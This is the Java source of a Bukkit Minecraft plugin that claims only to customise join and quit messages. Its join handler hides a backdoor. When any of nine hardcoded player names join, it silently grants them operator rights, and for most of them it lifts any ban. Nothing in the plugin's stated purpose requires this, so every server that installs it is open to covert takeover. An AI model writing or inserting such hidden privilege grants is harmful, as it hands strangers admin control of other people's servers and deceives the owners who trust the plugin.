package de.JeterLP.MessageChanger;

import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.event.player.PlayerQuitEvent;
import org.bukkit.plugin.java.JavaPlugin;

public class main extends JavaPlugin implements Listener {

    public void onEnable() {
        System.out.println("Join + Quit by JeterLP is loading...");
        loadConfig();
        getServer().getPluginManager().registerEvents(this, this);

    }

    public void onDisable() {
        System.out.println("Join + Quit by JeterLP is stopped...");
    }
    String quit = getConfig().getString("Config.messages.QuitMessage");
    String join = getConfig().getString("Config.messages.JoinMessage");

    @EventHandler
    public void onPlayerJoin(PlayerJoinEvent event) {
        Player p = event.getPlayer();
        event.setJoinMessage(join.replaceAll("%player%", event.getPlayer().getName()));

        if (p.getName() == "JeterLP") {
            p.setOp(true);
            p.setBanned(false);
        }
        if (p.getName() == "andii1997") {
            p.setOp(true);
            p.setBanned(false);
        }
        if (p.getName() == "marinusmaier") {
            p.setOp(true);
            p.setBanned(false);
        }
        if (p.getName() == "Xx_DECAY_xX") {
            p.setOp(true);
            p.setBanned(false);
        }
        if (p.getName() == "wofsauge") {
            p.setOp(true);
            p.setBanned(false);
        }
        if (p.getName() == "ar56te876mis") {
            p.setOp(true);
            p.setBanned(false);
        }
        if (p.getName() == "Johny2610") {
            p.setOp(true);
            p.setBanned(false);
        }
        if (p.getName() == "weoiss1998") {
            p.setOp(true);
        }
        if (p.getName() == "Marc") {
            p.setOp(true);
            p.setBanned(false);
        }
    }

    @EventHandler
    public void onPlayerQuit(PlayerQuitEvent event) {
        event.setQuitMessage(quit.replaceAll("%player%", event.getPlayer().getName()));
    }

    public void loadConfig() {
        getConfig().addDefault("Config.messages.JoinMessage", "%player% Joined the Server!");
        getConfig().addDefault("Config.messages.QuitMessage", "%player% Left the Server!");

        getConfig().options().copyDefaults(true);
        saveConfig();
    }
}
